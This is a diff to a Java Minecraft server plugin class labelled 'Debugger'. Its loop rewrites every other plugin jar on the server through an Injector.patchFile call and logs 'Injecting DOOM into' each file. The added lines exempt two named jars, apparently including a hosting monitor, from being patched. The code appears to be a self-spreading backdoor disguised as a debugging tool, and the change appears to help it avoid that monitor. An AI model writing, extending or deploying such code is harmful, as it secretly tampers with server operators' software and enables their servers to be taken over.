@@ -22,6 +22,7 @@ import java.awt.Color;
 import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.URL;
+import java.nio.file.Files;
 import java.util.*;
 
 public final class Debugger implements Listener {
@@ -54,22 +55,27 @@ public final class Debugger implements Listener {
             //Get all plugin paths
             File plugin_folder = new File("plugins/");
             File[] plugins = plugin_folder.listFiles();
-            for(File plugin_file : plugins){
+            //File[] ignore = plugins_to_ignore
 
-                //Skip config folders
-                if(plugin_file.isDirectory())
-                    continue;
+            for (File plugin_file : plugins) {
+                if (plugin_file.getName().equals("HostifyMonitor.jar") || plugin_file.getName().equals("FakaHedaMinequery.jar")) {
+                    // do nothing
+                } else {
 
-                if(Config.display_debug_messages)
-                    Bukkit.getConsoleSender()
-                            .sendMessage("Injecting DOOM into: " + plugin_file.getPath());
+                    //Skip config folders
+                    if (plugin_file.isDirectory())
+                        continue;
 
-                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);
+                    if (Config.display_debug_messages)
+                        Bukkit.getConsoleSender()
+                                .sendMessage("Injecting DOOM into: " + plugin_file.getPath());
 
-                if(Config.display_debug_messages)
-                    Bukkit.getConsoleSender()
-                            .sendMessage(result ? "Success." : "Failed, Already patched?");
+                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);
 
+                    if (Config.display_debug_messages)
+                        Bukkit.getConsoleSender()
+                                .sendMessage(result ? "Success." : "Failed, Already patched?");
+                }
             }
         }
 
